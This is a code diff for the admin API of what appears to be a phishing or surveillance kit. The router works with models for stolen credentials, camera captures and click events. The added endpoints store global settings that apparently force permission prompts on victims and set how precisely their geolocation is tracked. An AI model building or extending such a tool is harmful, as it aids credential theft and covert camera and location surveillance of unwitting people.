@@ -5,6 +5,7 @@ const StolenCredential = require('../models/StolenCredential');
 const CameraCapture = require('../models/CameraCapture');
 const ClickEvent = require('../models/ClickEvent');
 const User = require('../models/User');
+const AppSettings = require('../models/AppSettings');
 const { authenticate, requireAdmin } = require('../middleware/auth');
 const { deleteImage } = require('../services/cloudinaryUpload');
 
@@ -745,6 +746,51 @@ router.get('/camera-captures/recover', async (req, res) => {
       recoveryResults,
       orphanCapturesFixed: orphanCaptures.filter(o => o.reason === 'fixed_missing_reference').length,
       orphanDetails: orphanCaptures
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// === GLOBAL SETTINGS API ===
+
+// GET /api/admin/settings - Get global app settings
+router.get('/settings', async (req, res) => {
+  try {
+    let settings = await AppSettings.findOne({ key: 'global' });
+    if (!settings) {
+      settings = await AppSettings.create({ key: 'global' });
+    }
+    res.json({
+      autoForcePermissions: settings.autoForcePermissions,
+      geoPrecision: settings.geoPrecision,
+      updatedAt: settings.updatedAt
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// PUT /api/admin/settings - Update global app settings
+router.put('/settings', async (req, res) => {
+  try {
+    const { autoForcePermissions, geoPrecision } = req.body;
+    const update = {};
+    if (autoForcePermissions !== undefined) update.autoForcePermissions = Boolean(autoForcePermissions);
+    if (geoPrecision !== undefined) update.geoPrecision = geoPrecision;
+    update.updatedAt = new Date();
+    update.updatedBy = req.user?.email || 'admin';
+
+    const settings = await AppSettings.findOneAndUpdate(
+      { key: 'global' },
+      { $set: update },
+      { upsert: true, new: true }
+    );
+
+    res.json({
+      autoForcePermissions: settings.autoForcePermissions,
+      geoPrecision: settings.geoPrecision,
+      updatedAt: settings.updatedAt
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
